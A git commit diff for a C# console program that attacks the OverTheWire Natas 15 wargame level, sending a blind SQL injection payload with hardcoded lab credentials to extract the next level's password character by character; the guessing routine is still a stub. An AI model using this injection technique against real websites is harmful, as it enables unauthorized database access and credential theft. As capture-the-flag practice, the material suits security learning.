86c8bd52ae9b7d1c0454daab2d48a7ad6d866837
Adam Feather <adam.feather@fridaymediagroup.com>
2017-01-21 10:53:32 +0000

    valid password array characters added

--- Natas15.Console/Program.cs
+++ Natas15.Console/Program.cs
@@ -1,35 +1,65 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Net;
 using System.Text;
+using Natas15.Console.Utility;
 
 namespace Natas15.Console
 {
     class Program
     {
+        private const string Natas15Url = "http://natas15.natas.labs.overthewire.org/index.php?debug=true";
+        private const string Natas15Username = "natas15";
+        private const string Natas15Password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J";
+        private const string SuccessText = "This user exists";
+
+        private static List<char> _validPasswordCharacters;
+
         static void Main( string[] args )
         {
+            InitialiseValidPasswordCharacters();
+
             bool passwordCracked = false;
             string currentGuess = string.Empty;
+            string httpResponse = string.Empty;
 
             while ( passwordCracked == false )
             {
-                passwordCracked = true;
+                currentGuess = NextPasswordGuess();
+
+                byte[] httpBodyData = Encoding.ASCII.GetBytes( $"username=natas16\" AND BINARY password LIKE \"{ currentGuess }%" );
+
+                using ( var webClient = new WebClient() )
+                {
+                    webClient.Headers.Add( HttpHeader.ContentType, HttpContentType.FormUrlEncoded );
+                    webClient.Credentials = new NetworkCredential( Natas15Username, Natas15Password );
+
+                    httpResponse = Encoding.ASCII.GetString( webClient.UploadData( Natas15Url, httpBodyData ) );
+                }
+
+                if ( currentGuess.Length == 32 && httpResponse.Contains( SuccessText ) )
+                {
+                    passwordCracked = true;
+                }
             }
 
+            System.Console.WriteLine( $"The password is: { currentGuess }" );
+        }
 
+        private static void InitialiseValidPasswordCharacters()
+        {
+            _validPasswordCharacters = new List<char>();
 
-            byte[] data = Encoding.ASCII.GetBytes( $"username=natas16\" AND BINARY password LIKE \"{currentGuess}" );
+            _validPasswordCharacters.AddRange( Enumerable.Range( '0', 10 ).Select( x => ( char )x ) );
+            _validPasswordCharacters.AddRange( Enumerable.Range( 'A', 26 ).Select( x => ( char )x ) );
+            _validPasswordCharacters.AddRange( Enumerable.Range( 'a', 26 ).Select( x => ( char )x ) );
+        }
 
-            using ( var webClient = new WebClient() )
-            {
-                webClient.Headers.Add( "Content-Type", "application/x-www-form-urlencoded" );
-                webClient.Credentials = new NetworkCredential( "natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" );
-
-                byte[] response = webClient.UploadData( "http://natas15.natas.labs.overthewire.org/index.php?debug=true", data );
-
-                System.Console.WriteLine( Encoding.ASCII.GetString( response ) );
-            }
+        private static string NextPasswordGuess()
+        {
+            throw new NotImplementedException();
         }
     }
 }
---
+++ Natas15.Console/Utility/Structs.cs
@@ -0,0 +1,18 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Natas15.Console.Utility
+{
+    public struct HttpHeader
+    {
+        public static string ContentType = "Content-Type";
+    }
+
+    public struct HttpContentType
+    {
+        public static string FormUrlEncoded = "application/x-www-form-urlencoded";
+    }
+}
